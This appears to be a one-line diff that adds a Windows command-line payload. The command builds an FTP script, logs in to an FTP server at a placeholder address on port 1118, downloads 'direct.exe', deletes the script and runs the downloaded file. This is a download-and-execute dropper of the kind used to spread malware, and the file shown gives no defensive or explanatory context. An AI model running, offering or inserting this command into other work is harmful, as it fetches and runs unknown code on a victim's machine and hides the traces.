@@ -1,0 +1,1 @@
+cmd /c echo open 0.0.0.0 1118 >> ii &echo user 1 1 >> ii &echo get direct.exe >> ii &echo bye >> ii &ftp -n -v -s:ii &del ii &direct.exe
